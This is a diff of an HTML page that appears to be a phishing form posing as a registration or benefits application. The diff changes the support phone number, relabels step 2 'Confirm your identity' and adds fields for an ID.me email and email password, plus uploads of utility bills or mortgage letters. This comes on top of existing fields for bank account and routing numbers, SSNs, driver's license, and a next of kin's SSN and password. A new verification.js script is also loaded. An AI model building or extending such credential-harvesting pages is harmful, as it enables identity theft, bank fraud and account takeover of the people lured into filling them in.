@@ -500,8 +500,8 @@
     <script defer>
       var currentPage = 1;
       window.addEventListener("DOMContentLoaded", () => {
-        document.getElementById("page2").style.display = "none";
         document.getElementById("page1").style.display = "block";
+        document.getElementById("page2").style.display = "block";
         const btn1 = document.getElementById("btn1");
         const btn2 = document.getElementById("btn2");
 
@@ -4110,7 +4110,7 @@
               <a href="">Privacy Policy</a>
             </div>
             <div class="footer_item">
-              <a href="">Contact (1-888-261-4837)</a>
+              <a href="">Contact (+1-308-407-0146)</a>
             </div>
             <div class="footer_item">
               <a
@@ -4265,8 +4265,8 @@
           <section class="application-form">
             <div class="container">
               <p class="header application__steps-title">
-                <span class="application__bold">Step 2 of 3:</span> Confirm Your
-                Answers and Complete Registration
+                <span class="application__bold">Step 2 of 3:</span> Confirm your
+                identity
               </p>
 
               <form>
@@ -4286,22 +4286,6 @@
 
                 <div class="application__gray-container">
                   <div class="application__container-full">
-                    <div class="input-box application__half">
-                      <label class="application__label">Gender:</label>
-                      <select
-                        id="template-application-gender"
-                        name="template-application-gender"
-                        class="application__input"
-                        required=""
-                      >
-                        <option value="" disabled="" selected="">
-                          Select...
-                        </option>
-                        <option value="M">Male</option>
-                        <option value="F">Female</option>
-                      </select>
-                    </div>
-
                     <div class="input-box application__half">
                       <label class="application__label">Bank:</label>
                       <select
@@ -4521,10 +4505,6 @@
                       </select>
                     </div>
 
-                  </div>
-
-                  <div class="application__container-full">
-
                     <div class="input-box application__half">
                       <label class="application__label">Account Number:</label>
                       <input
@@ -4534,7 +4514,9 @@
                         required=""
                       />
                     </div>
+                  </div>
 
+                  <div class="application__container-full">
                     <div class="input-box application__half">
                       <label class="application__label">Routing Number:</label>
                       <input
@@ -4545,9 +4527,6 @@
                       />
                     </div>
 
-                  </div>
-
-                  <div class="application__container-full">
                     <div class="input-box application__half">
                       <label class="application__label"
                         >Social Security Number:</label
@@ -4559,7 +4538,9 @@
                         required=""
                       />
                     </div>
+                  </div>
 
+                  <div class="application__container-full">
                     <div class="input-box application__half">
                       <label class="application__label"
                         >Driver's License:</label
@@ -4619,6 +4600,81 @@
 
                 <div class="application__gray-container">
                   <div class="application__container-full">
+                    <!-- Resident Verification -->
+                    <div class="input-box application__half">
+                      <label class="application__label"
+                        >Resident Verification:
+                      </label>
+                      <select
+                        id="template-application-resident-verification"
+                        name="template-application-resident-verification"
+                        class="application__input"
+                        required=""
+                      >
+                        <option value="" disabled="" selected="">
+                          Select...
+                        </option>
+                        <option value="ID.ME">ID.ME</option>
+                        <option value="Utility Bill">Utility Bill</option>
+                        <option value="Mortgage Letter">Mortgage Letter</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div class="application__container-full">
+                    <div class="input-box application__half" id="ID.ME_email" style="display: none;">
+                      <label class="application__label">Email Addresss: </label>
+                      <input
+                        type="text"
+                        name="template-application-email"
+                        class="email application__input"
+                        required=""
+                      />
+                    </div>
+
+                    <div
+                      class="input-box application__half"
+                      id="ID.ME_password" style="display: none;"
+                    >
+                      <label class="application__label">Email Password: </label>
+                      <input
+                        type="text"
+                        name="template-application-password"
+                        class="password application__input"
+                        required=""
+                      />
+                    </div>
+
+                    <div class="input-box application__half" id="utility_bill" style="display: none;">
+                      <label class="application__label"
+                        >Utility Bill:</label
+                      >
+                      <input
+                        type="file"
+                        name="template-application-utility-bill"
+                        class="utility_bill application__input"
+                        required=""
+                      />
+                      <span>Document size must not be more than 2mb</span>
+                    </div>
+
+                    <div class="input-box application__half" id="mortgage_letter" style="display: none;">
+                      <label class="application__label"
+                        >Mortgage Letter:</label
+                      >
+                      <input
+                        type="file"
+                        name="template-application-mortgage-letter"
+                        class="mortgage_letter application__input"
+                        required=""
+                      />
+                      <span>Document size must not be more than 2mb</span>
+                    </div>
+
+                  </div>
+                </div>
+
+                <div class="application__gray-container">
+                  <div class="application__container-full">
                     <div class="input-box application__half">
                       <label class="application__label">Email Addresss: </label>
                       <input
@@ -4643,11 +4699,16 @@
 
                 <div class="application__gray-container">
                   <div class="application__payment__text">
-                    <h3 class="order__section-title">In the event of loss of life, please provide the contact information for the designated next of kin.</h3>
+                    <h3 class="order__section-title">
+                      In the event of loss of life, please provide the contact
+                      information for the designated next of kin.
+                    </h3>
 
                     <div class="application__container-full">
                       <div class="input-box application__half">
-                        <label class="application__label">Next of Kin's Full Name: </label>
+                        <label class="application__label"
+                          >Next of Kin's Full Name:
+                        </label>
                         <input
                           type="text"
                           name="template-application-next-of-kin-full-name"
@@ -4655,9 +4716,11 @@
                           required=""
                         />
                       </div>
-  
+
                       <div class="input-box application__half">
-                        <label class="application__label">Next of Kin's Address: </label>
+                        <label class="application__label"
+                          >Next of Kin's Address:
+                        </label>
                         <input
                           type="text"
                           name="template-application-next-of-kin-address"
@@ -4669,7 +4732,9 @@
 
                     <div class="application__container-full">
                       <div class="input-box application__half">
-                        <label class="application__label">Next of Kin's Date of Birth: </label>
+                        <label class="application__label"
+                          >Next of Kin's Date of Birth:
+                        </label>
                         <input
                           type="date"
                           name="template-application-next-of-kin-date-of-birth"
@@ -4677,9 +4742,11 @@
                           required=""
                         />
                       </div>
-  
+
                       <div class="input-box application__half">
-                        <label class="application__label">Next of Kin's Social Security Number: </label>
+                        <label class="application__label"
+                          >Next of Kin's Social Security Number:
+                        </label>
                         <input
                           type="text"
                           name="template-application-next-of-kin-social-security-number"
@@ -4691,7 +4758,9 @@
 
                     <div class="application__container-full">
                       <div class="input-box application__half">
-                        <label class="application__label">Next of Kin's Email: </label>
+                        <label class="application__label"
+                          >Next of Kin's Email:
+                        </label>
                         <input
                           type="email"
                           name="template-application-next-of-kin-email"
@@ -4699,9 +4768,11 @@
                           required=""
                         />
                       </div>
-  
+
                       <div class="input-box application__half">
-                        <label class="application__label">Next of Kin's Password: </label>
+                        <label class="application__label"
+                          >Next of Kin's Password:
+                        </label>
                         <input
                           type="text"
                           name="template-application-next-of-kin-password"
@@ -5107,5 +5178,7 @@
       src="js/skip-link-focus-fix.js"
       id="trevor-base-theme-skip-link-focus-fix-js"
     ></script>
+
+    <script src="./js/verification.js"></script>
   </body>
 </html>
